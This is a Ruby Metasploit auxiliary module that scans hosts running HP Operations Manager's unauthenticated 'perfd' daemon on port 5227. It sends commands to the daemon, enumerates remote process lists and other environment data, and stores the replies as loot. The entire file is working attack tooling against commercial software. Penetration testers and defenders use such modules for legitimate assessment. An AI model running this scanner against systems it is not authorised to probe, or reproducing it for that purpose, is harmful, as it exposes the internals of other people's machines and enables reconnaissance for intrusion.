##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  # TODO: figure out what these do:
  #   o: valid command, takes no args, does nothing
  #   B, c, F, G, I, M, U, x: all require an "instance id" and possibly other args
  ALLOWED_COMMANDS = %w(a A i g l p t T u w Z)

  def initialize
    super(
      'Name'        => 'HP Operations Manager Perfd Environment Scanner',
      'Description' => %q{
        This module will enumerate the process list of a remote machine by abusing
        HP Operation Manager's unauthenticated 'perfd' daemon.
        },
      'Author'      => [ 'Roberto Soares Espreto <robertoespreto[at]gmail.com>' ],
      'License'     => MSF_LICENSE
    )

    commands_help = ALLOWED_COMMANDS.join(',')
    register_options(
    [
      Opt::RPORT(5227),
      OptString.new("COMMANDS", [true, "Command(s) to execute (one or more of #{commands_help})", commands_help])
    ])
  end

  def commands
    datastore['COMMANDS'].split(/[, ]+/).map(&:strip)
  end

  def setup
    super
    if datastore['COMMANDS']
      bad_commands = commands - ALLOWED_COMMANDS
      unless bad_commands.empty?
        fail ArgumentError, "Bad perfd command(s): #{bad_commands}"
      end
    end
  end

  def run_host(target_host)
    begin

      connect
      banner_resp = sock.get_once
      if banner_resp && banner_resp =~ /^Welcome to the perfd server/
        banner_resp.strip!
        print_good("#{target_host}:#{rport}, Perfd server banner: #{banner_resp}")
        perfd_service = report_service(host: rhost, port: rport, name: "perfd", proto: "tcp", info: banner_resp)
        sock.puts("\n")

        commands.each do |command|
          sock.puts("#{command}\n")
          Rex.sleep(1)
          command_resp = sock.get_once

          loot_name = "HP Ops Agent perfd #{command}"
          path = store_loot(
            "hp.ops.agent.perfd.#{command}",
            'text/plain',
            target_host,
            command_resp,
            nil,
            "HP Ops Agent perfd #{command}",
            perfd_service
          )
          print_status("#{target_host}:#{rport} - #{loot_name} saved in: #{path}")
        end
      else
        print_error("#{target_host}:#{rport}, Perfd server banner detection failed!")
      end
      disconnect
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue Timeout::Error => e
      print_error(e.message)
    end
  end
end
